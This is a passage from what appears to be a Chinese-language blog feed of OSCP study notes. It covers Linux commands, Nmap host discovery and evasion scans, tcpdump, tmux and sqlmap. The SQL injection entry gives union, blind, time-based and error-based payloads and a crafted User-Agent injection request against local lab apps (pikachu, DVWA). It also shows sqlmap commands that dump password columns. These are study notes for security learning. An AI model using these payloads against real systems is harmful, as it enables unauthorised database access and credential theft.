job。</td></tr><tr><td align="center">%-</td><td align="center">指上一个 job。</td></tr></tbody></table><h2 id="进程控制-ps-和-kill"><a href="#进程控制-ps-和-kill" class="headerlink" title="进程控制 (ps 和 kill)"></a>进程控制 (<code>ps</code> 和 <code>kill</code>)</h2><h3 id="ps-命令"><a href="#ps-命令" class="headerlink" title="ps 命令"></a><code>ps</code> 命令</h3><blockquote><p><code>ps</code> 查看系统进程最有用的命令之一。列出系统范围内的进程。</p></blockquote><p>常用参数</p><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">e</td><td align="left">选择所有进程</td></tr><tr><td align="center">f</td><td align="left">显示完整格式列表(UID, PID, PPID 等)</td></tr><tr><td align="center">C</td><td align="left">按命令名选择</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">格式化查看当前所有进程</span></span><br><span class="line">ps -ef</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">格式化查看zsh进程</span></span><br><span class="line">ps -fC zsh</span><br></pre></td></tr></table></figure><p><code>kill</code> 命令</p><blockquote><p><code>kill</code> 向进程发送特定的信号。</p></blockquote><blockquote><p><code>kill signal &lt;process pid&gt;</code></p><p><code>signal</code> 默认是 SIGTERM, 为关闭进程的信号。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭PID为12345的进程</span></span><br><span class="line">kill 12345</span><br></pre></td></tr></table></figure><h1 id="kali-linux-文件和命令监视"><a href="#kali-linux-文件和命令监视" class="headerlink" title="kali linux 文件和命令监视"></a>kali linux 文件和命令监视</h1><hr><h2 id="文件监视"><a href="#文件监视" class="headerlink" title="文件监视"></a>文件监视</h2><h3 id="tail-命令"><a href="#tail-命令" class="headerlink" title="tail 命令"></a><code>tail</code> 命令</h3><blockquote><p><code>tail</code> 命令用来命令行查看文件(默认查看最后 10 行)。常用来监视正在写入的日志文件条目。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f参数，让<span class="built_in">tail</span>随着目标文件的增长不断更新输出。-nX 设置输出最后X行。</span></span><br><span class="line">tail -f -n20 /var/logs/apache2/access.log</span><br></pre></td></tr></table></figure><h3 id="watch-命令"><a href="#watch-命令" class="headerlink" title="watch 命令"></a><code>watch</code> 命令</h3><blockquote><p><code>tail</code> 命令用来定期运行指定的命令，在默认情况下每两秒钟运行一次。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-n 用来指定每多少秒运行一次。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">该命令表示每1s种运行一次 ps -ef</span></span><br><span class="line">watch -n 1 ps -ef</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每秒钟显示一次当前cpu占用前十的进程。</span></span><br><span class="line">watch -n 1 &#x27;ps aux --sort=-%cpu | head -n 10&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每秒钟显示一次当前内存占用前十的进程。</span></span><br><span class="line">watch -n 1 &#x27;ps aux --sort=-%mem | head -n 10&#x27;</span><br></pre></td></tr></table></figure><h1 id="kali-linux-命令行文件下载"><a href="#kali-linux-命令行文件下载" class="headerlink" title="kali linux 命令行文件下载"></a>kali linux 命令行文件下载</h1><hr><h2 id="wget-命令"><a href="#wget-命令" class="headerlink" title="wget 命令"></a><code>wget</code> 命令</h2><blockquote><p><code>wget</code> 命令我们将广泛使用它，用于通过 HTTP&#x2F;HTTPS 和 FTP 协议下载文件。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用`-O` 来为下载的文件重命名</span></span><br><span class="line">wget -O &lt;save filename&gt; &lt;file url&gt;</span><br></pre></td></tr></table></figure><h2 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a><code>curl</code> 命令</h2><blockquote><p><code>curl</code> 命令使用多种协议（包括 IMAP&#x2F;S、POP3&#x2F;S、SCP、SFTP、SMB&#x2F;S、SMTP&#x2F;S、TELNET、TFTP 等）与服务器之间传输数据。渗透测试人员可以使用它来下载或上传文件，并构建复杂的请求。它的最基本用法与 wget 非常相似。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用`-o` 来为下载的文件重命名</span></span><br><span class="line">curl -o &lt;save filename&gt; &lt;file url&gt;</span><br></pre></td></tr></table></figure><h2 id="axel-命令"><a href="#axel-命令" class="headerlink" title="axel 命令"></a><code>axel</code> 命令</h2><blockquote><p><code>axel</code> 命令通过多个连接从 FTP 或 HTTP 服务器传输文件。这个工具具有广泛的功能。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用<span class="string">&quot;-n&quot;</span>选项来指定使用的多个连接数。在下面的示例中，我们还使用<span class="string">&quot;-a&quot;</span>选项来显示更简洁的进度指示器，以及<span class="string">&quot;-o&quot;</span>选项来指定下载文件的不同文件名。</span></span><br><span class="line">axel -n 20 -a -o &lt;save filename&gt; &lt;file url&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP学习 </tag>
            
            <tag> Kali Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap主机发现</title>
      <link href="/2023/10/20/Nmap%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/"/>
      <url>/2023/10/20/Nmap%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap-主机发现"><a href="#Nmap-主机发现" class="headerlink" title="Nmap 主机发现"></a>Nmap 主机发现</h1><h2 id="主机发现常见方法"><a href="#主机发现常见方法" class="headerlink" title="主机发现常见方法"></a>主机发现常见方法</h2><h3 id="ARP扫描"><a href="#ARP扫描" class="headerlink" title="ARP扫描"></a><code>ARP</code>扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -PR -sn 192.168.68.0/24 <span class="comment"># 使用ARP协议探测主机存活</span></span><br></pre></td></tr></table></figure><h3 id="ICMP扫描"><a href="#ICMP扫描" class="headerlink" title="ICMP扫描"></a><code>ICMP</code>扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -PE -sn 192.168.68.0/24 <span class="comment"># 使用ICMP回显请求</span></span><br><span class="line">sudo nmap -PM -sn 192.168.68.0/24 <span class="comment"># 使用ICMP地址掩码请求</span></span><br><span class="line">sudo nmap -PP -sn 192.168.68.0/24 <span class="comment"># 使用ICMP时间戳请求</span></span><br></pre></td></tr></table></figure><h3 id="TCP-UDP扫描"><a href="#TCP-UDP扫描" class="headerlink" title="TCP/UDP扫描"></a><code>TCP/UDP</code>扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -PA[PORT] -sn 192.168.68.0/24 <span class="comment"># 发送ACK包给TCP端口探测存活，默认80端口 必须要特权账户</span></span><br><span class="line">nmap -PS[PORT] -sn 192.168.68.0/24 <span class="comment"># 发送SYN给TCP端口探测存活，默认80端口</span></span><br><span class="line">sudo nmap -PU[PORT] -sn 192.168.68.0/24 <span class="comment"># 发送给UDP端口探测存活，默认80端口</span></span><br></pre></td></tr></table></figure><h3 id="DNS反向查找"><a href="#DNS反向查找" class="headerlink" title="DNS反向查找"></a><code>DNS</code>反向查找</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap默认对在线主机进行DNS反向查找， 可以使用-n禁用</span></span><br><span class="line"><span class="comment"># 对于离线主机，可以使用-R 来进行DNS查找</span></span><br><span class="line"><span class="comment"># --dns-servers DNS_SERVER 指定域名服务器</span></span><br><span class="line">nmap -PE -s 192.168.68.0/24 -R --dns-servers 8.8.8.8</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP学习 </tag>
            
            <tag> Kali Tools </tag>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap端口扫描</title>
      <link href="/2023/10/20/Nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
      <url>/2023/10/20/Nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap端口扫描"><a href="#Nmap端口扫描" class="headerlink" title="Nmap端口扫描"></a><code>Nmap</code>端口扫描</h1><h2 id="端口扫描类型"><a href="#端口扫描类型" class="headerlink" title="端口扫描类型"></a>端口扫描类型</h2><table><thead><tr><th>端口扫描类型</th><th>命令示例</th></tr></thead><tbody><tr><td>TCP 连接扫描</td><td>nmap -sT 10.10.132.233</td></tr><tr><td>TCP SYN 扫描</td><td>sudo nmap -sS 10.10.132.233</td></tr><tr><td>TCP FIN 扫描</td><td>sudo nmap -sF 10.10.132.233</td></tr><tr><td>TCP UDP 扫描</td><td>sudo nmap -sU 10.10.132.233</td></tr></tbody></table><h2 id="Nmap端口扫描常用参数"><a href="#Nmap端口扫描常用参数" class="headerlink" title="Nmap端口扫描常用参数"></a><code>Nmap</code>端口扫描常用参数</h2><table><thead><tr><th>选项</th><th>目的</th></tr></thead><tbody><tr><td>-p-</td><td>所有端口</td></tr><tr><td>-p1-1023</td><td>扫描 1-1023 的所有端口</td></tr><tr><td>-F</td><td>扫描 1000 个最常用的端口</td></tr><tr><td>-r</td><td>按连续顺序扫描端口</td></tr><tr><td>-T&lt;0-5&gt;</td><td>-T0 最慢，T5 最快</td></tr><tr><td>-max-rate 50</td><td>速率 &lt;&#x3D;50 数据包&#x2F;秒</td></tr><tr><td>-min-rate 50</td><td>速率 &gt;&#x3D; 50 数据包&#x2F;秒</td></tr><tr><td>–min-parallelism 100</td><td>至少 100 个并行探头</td></tr><tr><td>–max-parallelism 100</td><td>最多 100 个并行探头</td></tr></tbody></table><h2 id="高级端口扫描"><a href="#高级端口扫描" class="headerlink" title="高级端口扫描"></a>高级端口扫描</h2><table><thead><tr><th>端口扫描类型</th><th>命令示例</th></tr></thead><tbody><tr><td>TCP 空扫描</td><td>sudo nmap -sN 10.10.187.43</td></tr><tr><td>TCP FIN 扫描</td><td>sudo nmap -sF 10.10.187.43</td></tr><tr><td>TCP Xmas(圣诞)扫描</td><td>sudo nmap -sX10.10.187.43</td></tr><tr><td>TCP Maimon 扫描</td><td>sudo nmap -sM 10.10.187.43</td></tr><tr><td>TCP ACK 扫描</td><td>sudo nmap -sA 10.10.187.43</td></tr><tr><td>TCP 窗口扫描</td><td>sudo nmap -sW 10.10.187.43</td></tr><tr><td>自定义 TCP 扫描</td><td>sudo nmap –scanflags URGACKPSHRSTSYNFIN 10.10.187.43</td></tr><tr><td>欺骗源 IP</td><td>sudo nmap -S SPOOFED_IP 10.10.187.43</td></tr><tr><td>欺骗 MAC 地址</td><td>–spoof-mac SPOOFED_MAC</td></tr><tr><td>Decoy Scan 诱饵扫描</td><td>nmap -D DECOY_IP,ME 10.10.187.43</td></tr><tr><td>Idle (Zombie) Scan 空闲（僵尸）扫描</td><td>sudo nmap -sI ZOMBIE_IP 10.10.187.43</td></tr><tr><td>将 IP 数据分片成 8 个字节</td><td>-f</td></tr><tr><td>将 IP 数据分片成 16 字节</td><td>-ff</td></tr></tbody></table><table><thead><tr><th>选项</th><th>目的</th></tr></thead><tbody><tr><td>–reason</td><td>解释 Nmap 如何得出结论</td></tr><tr><td>-v</td><td>显示详细信息</td></tr><tr><td>-vv</td><td>非常详细</td></tr><tr><td>-d</td><td>显示调试信息</td></tr><tr><td>-dd</td><td>更多调试信息</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP学习 </tag>
            
            <tag> Kali Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL 注入</title>
      <link href="/2023/10/20/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/10/20/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><h2 id="显注"><a href="#显注" class="headerlink" title="显注"></a>显注</h2><h3 id="页面会得到-sql-语句运行的结果"><a href="#页面会得到-sql-语句运行的结果" class="headerlink" title="页面会得到 sql 语句运行的结果"></a>页面会得到 sql 语句运行的结果</h3><h3 id="原理是通过-来提前接结束-sql-语句来打到修改原来-sql-语句查询结果的目的"><a href="#原理是通过-来提前接结束-sql-语句来打到修改原来-sql-语句查询结果的目的" class="headerlink" title="原理是通过 &#39; 来提前接结束 sql 语句来打到修改原来 sql 语句查询结果的目的"></a>原理是通过 <code>&#39;</code> 来提前接结束 sql 语句来打到修改原来 sql 语句查询结果的目的</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; order by 1 #</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>(),database() #</span><br></pre></td></tr></table></figure><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="页面不会直接得到-sql-语句运行的结果，而是处理后的返回的逻辑值"><a href="#页面不会直接得到-sql-语句运行的结果，而是处理后的返回的逻辑值" class="headerlink" title="页面不会直接得到 sql 语句运行的结果，而是处理后的返回的逻辑值"></a>页面不会直接得到 sql 语句运行的结果，而是处理后的返回的逻辑值</h3><h3 id="原理是通过逻辑语句来探测"><a href="#原理是通过逻辑语句来探测" class="headerlink" title="原理是通过逻辑语句来探测"></a>原理是通过逻辑语句来探测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and substr(length(user()), 1, 1) &gt; 20 #</span></span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="页面没有任何返回值，但是可以通过-sleep-函数，执行逻辑语句，查看页面响应时间来探测"><a href="#页面没有任何返回值，但是可以通过-sleep-函数，执行逻辑语句，查看页面响应时间来探测" class="headerlink" title="页面没有任何返回值，但是可以通过 sleep()函数，执行逻辑语句，查看页面响应时间来探测"></a>页面没有任何返回值，但是可以通过 sleep()函数，执行逻辑语句，查看页面响应时间来探测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and if(substr(length(user()), 1, 1) &gt; 20, sleep(5), 1) #</span></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="见于其他非查询的数据操作语句中，使用extractvalue和updatexml两个函数"><a href="#见于其他非查询的数据操作语句中，使用extractvalue和updatexml两个函数" class="headerlink" title="见于其他非查询的数据操作语句中，使用extractvalue和updatexml两个函数"></a>见于其他非查询的数据操作语句中，使用<code>extractvalue</code>和<code>updatexml</code>两个函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># extractvalue函数一次最多返回<span class="number">32</span>位数据, 在查询长数据时最好使用limit限制输出</span><br><span class="line"><span class="string">&#x27; and extractvalue(1, concat(0x73, (select username from pikachu.users limit 0,1)</span></span><br></pre></td></tr></table></figure><h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">User</span><span class="operator">-</span>Agent 注入</span><br><span class="line"><span class="string">&#x27; or extractvalue(1, concat(0x7e, (select group_concat(username) from pikachu.users))) or &#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/vul/sqli/sqli_header/sqli_header.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:89</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:89/vul/sqli/sqli_header/sqli_header_login.php</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; BEEFHOOK=rslJkXvhRbZaZhLLQLrPBsa7CK7tOYk6luzS8U9Y4TARyOq64MLYxzpsQzcOAInHegjwt332CxFUxmxE; PHPSESSID=os0e0p3hv02162bk2dtsntrbm3</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Map</title>
      <link href="/2023/10/20/SQLMAP/"/>
      <url>/2023/10/20/SQLMAP/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><table><thead><tr><th>参数</th><th>详解</th></tr></thead><tbody><tr><td>-u</td><td>指定 url</td></tr><tr><td>-r</td><td>指定文件</td></tr><tr><td>-p</td><td>指定注入点</td></tr><tr><td>–cookie</td><td>指定 cookie</td></tr><tr><td>–dbs</td><td>注入库名</td></tr><tr><td>–D</td><td>指定库名</td></tr><tr><td>–tables</td><td>注入表名</td></tr><tr><td>-T</td><td>指定表名</td></tr><tr><td>–columns</td><td>注入列名</td></tr><tr><td>-C</td><td>指定列名</td></tr><tr><td>–dump</td><td>注入数据</td></tr></tbody></table><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定以文件中的请求包格式注入获取dvwa数据库中的所有表单</span></span><br><span class="line">`sqlmap -r sql_request.txt -D dvwa --tables`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以url中的id为注入点，注入dvwa库下，users表下的password列的数据。</span></span><br><span class="line">`sqlmap -r sql_request.txt -p <span class="built_in">id</span> -D dvwa -T <span class="built_in">users</span> -C password --dump`</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP学习 </tag>
            
            <tag> Kali Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tmux</title>
      <link href="/2023/10/20/Tmux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/10/20/Tmux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p><code>Tmux</code>基本操作</p><p><code>Ctrl+B</code> + <code>Shift+&quot;</code> 左右拆分终端</p><p><code>Ctrl+B</code> + <code>Shift+%</code> 上下拆分终端</p><p><code>Ctrl+B</code> + 按住<code>Alt</code> + 方向键 更改终端大小</p><p><code>Ctrl+B</code> + z 切换当前终端全屏显示</p>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP学习 </tag>
            
            <tag> Kali Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcpdump的使用</title>
      <link href="/2023/10/20/tcpdump/"/>
      <url>/2023/10/20/tcpdump/</url>
      
        <content type="html"><![CDATA[<h1 id="tcpdump-的使用"><a href="#tcpdump-的使用" class="headerlink" title="tcpdump 的使用"></a><code>tcpdump</code> 的使用</h1><h2 id="认识TCP头部"><a href="#认识TCP头部" class="headerlink" title="认识TCP头部"></a>认识<code>TCP头部</code></h2><p><img src="C:\Users\VM110\Desktop\渗透测试学习\OSCP基础渗透测试学习\笔记\tcp_header.png" alt="TCP Header"></p><h2 id="tcpdump的基本使用"><a href="#tcpdump的基本使用" class="headerlink" title="tcpdump的基本使用"></a><code>tcpdump</code>的基本使用</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">% sudo tcpdump</span><br><span class="line"></span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">21:19:16.956496 IP 172.30.224.1.mdns &gt; mdns.mcast.net.mdns: 0 A (QM)? cf60825f-49a2-46d0-8ec5-e32907459979.local. (60)</span><br><span class="line">21:19:16.956611 IP6 VM110.mdns &gt; ff02::fb.mdns: 0 A (QM)? cf60825f-49a2-46d0-8ec5-e32907459979.local. (60)</span><br><span class="line">21:19:17.051187 IP 172.30.227.118.41506 &gt; 172.30.224.1.domain: 29901+ PTR? 251.0.0.224.in-addr.arpa. (42)</span><br><span class="line">21:19:17.052100 IP 172.30.224.1.domain &gt; 172.30.227.118.41506: 29901- 1/0/0 PTR mdns.mcast.net. (94)</span><br><span class="line">21:19:17.052446 IP 172.30.227.118.46960 &gt; 172.30.224.1.domain: 20754+ PTR? 1.224.30.172.in-addr.arpa. (43)</span><br><span class="line">21:19:17.055238 IP 172.30.224.1.domain &gt; 172.30.227.118.46960: 20754- 1/0/0 PTR 172.30.224.1. (94)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><blockquote><p><code>21:19:17.051187 IP 172.30.227.118.41506 &gt; 172.30.224.1.domain: 29901+ PTR?251.0.0.224.in-addr.arpa. (42)</code></p><p>时间（时：分：秒：毫秒） 网络协议 源（src）IP.端口 &gt;(表示数据流方向) 目的(dst)IP.端口: 数据包内容（包括 flags、seq、ack、win、数据长度等）</p></blockquote><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th align="left">参数</th><th>解析</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">-i</td><td>指定监听的网络接口( 默认为第一个接口, <code>any</code>表示所有网卡 )</td><td align="left"><code>sudo tcpdump -i any</code></td></tr><tr><td align="left">-w</td><td>将捕获到的信息保存到文件中，且不分析和打印在屏幕上</td><td align="left"><code>sudo tcpdump -w &lt;filename&gt;.pcap</code></td></tr><tr><td align="left">-r</td><td>从文件读取数据。读取后我们，照样可以通过语法过滤</td><td align="left"><code>sudo tcpdump -r &lt;filename&gt;.pcap</code></td></tr><tr><td align="left">-n</td><td>同时<code>禁用DNS主机名解析</code>和<code>端口号解析</code></td><td align="left"><code>sudo tcpdump -n </code></td></tr><tr><td align="left">-nn</td><td>同时<code>禁用DNS主机名解析</code>和<code>端口号解析</code></td><td align="left"><code>sudo tcpdump -nn</code></td></tr><tr><td align="left">-N</td><td>禁用<code>DNS主机名解析</code>, 提高速度</td><td align="left"><code>sudo tcpdump -N</code></td></tr><tr><td align="left">-t</td><td>每行输出中不输出时间</td><td align="left"><code>sudo tcpdumo -t</code></td></tr><tr><td align="left">-tt</td><td>每行输出中会输出<code>Unix时间戳</code></td><td align="left"><code>sudo tcpdump -tt</code></td></tr><tr><td align="left">-ttt</td><td>输出每行打印的时间间隔</td><td align="left"><code>sudo tcpdump -ttt</code></td></tr><tr><td align="left">-tttt</td><td>在每行打印的时间戳之前添加日期的打印</td><td align="left"><code>sudo tcpdump -tttt</code></td></tr><tr><td align="left">-v</td><td>对产生数据包详细的输出</td><td align="left"><code>sudo tcpdump -v</code></td></tr><tr><td align="left">-vv</td><td>比<code>-v</code>更加详细的输出</td><td align="left"><code>sudo tcpdump -vv</code></td></tr><tr><td align="left">-vvv</td><td>比<code>-vv</code>更加详细的输出</td><td align="left"><code>sudo tcpdump -vvv</code></td></tr><tr><td align="left">-c</td><td>指定捕获数据包的数量</td><td align="left"><code>sudo tcpdump -c 20</code></td></tr><tr><td align="left">-C</td><td>和<code>-w</code>连用，指定单个保存的文件的大小(默认单位为<code>MB</code>)，如果超过了从新写入一个新的文件(在指定的文件名后添加序号)</td><td align="left"><code>sudo tcpdump -w &lt;filename&gt;.pcap -C 1</code></td></tr><tr><td align="left">-W</td><td>限制捕获的数据包的文件的个数，和<code>-C</code>连用</td><td align="left"><code>sudo tcpdump -w &lt;filename&gt;.pcap -C 1 -W 3</code></td></tr><tr><td align="left">-Q</td><td>选择是入方向还是出方向的数据包: <code>in</code> 、 <code>out</code> 、 <code>inout</code></td><td align="left"><code>sudo tcpdump -Q in</code></td></tr><tr><td align="left">-q</td><td>简洁的打印输出， 减少数据包信息的输出</td><td align="left"><code>sudo tcpdump -q</code></td></tr><tr><td align="left">-D</td><td>显示所有的可用的网络接口列表</td><td align="left"><code>sudo tcpdump -D</code></td></tr><tr><td align="left">-L</td><td>列出网络接口的已知数据链路</td><td align="left"><code>sudo tcpdump -L</code></td></tr><tr><td align="left">-s</td><td>指定每个捕获的包的长度,超过会截断,单位是<code>字节(bytes)</code></td><td align="left"><code>sudo tcpumpd -s 50</code></td></tr><tr><td align="left">-A</td><td>以 ASCII 码的格式打印出包的内容。 <code>-A</code> 和 <code>-X</code> 不能同时使用</td><td align="left"><code>sudo tcpdump -A</code></td></tr><tr><td align="left">-X</td><td>同时以 ASCII 码和十六进制的格式打印出包的内容</td><td align="left"><code>sudo tcpdump -X</code></td></tr><tr><td align="left">-e</td><td>在输出行打印出数据链路层的头部信息</td><td align="left"><code>sudo tcpdump -e</code></td></tr><tr><td align="left">-F</td><td>指定使用哪个文件的过滤规则过滤包,此时命令行上的过滤规则将会被忽略</td><td align="left"><code>sudo tcpdump -F &lt;filename&gt;</code></td></tr><tr><td align="left">-l</td><td>对标准输出进行缓冲，可以使用其他命令保存数据包</td><td align="left"><code>sudo tcpdump -l &gt; &lt;filename&gt; &amp;&amp; tail -f &lt;filename&gt; </code></td></tr></tbody></table><blockquote><p>保存的文件为<code>cap</code>或者 <code>pcap</code>可以直接通过<code>wireshark</code>打开</p></blockquote><h3 id="常用滤规则"><a href="#常用滤规则" class="headerlink" title="常用滤规则"></a>常用滤规则</h3><p>在<code>tcpdump</code>中支持逻辑运算符(<code>and</code> 、 <code>or</code> 、 <code>not</code> 或者 <code>&amp;&amp;</code> 、 <code>||</code> 、 <code>!</code>)来过滤数据包</p><h4 id="基于IP地址的过滤"><a href="#基于IP地址的过滤" class="headerlink" title="基于IP地址的过滤"></a>基于<code>IP地址</code>的过滤</h4><h5 id="host过滤"><a 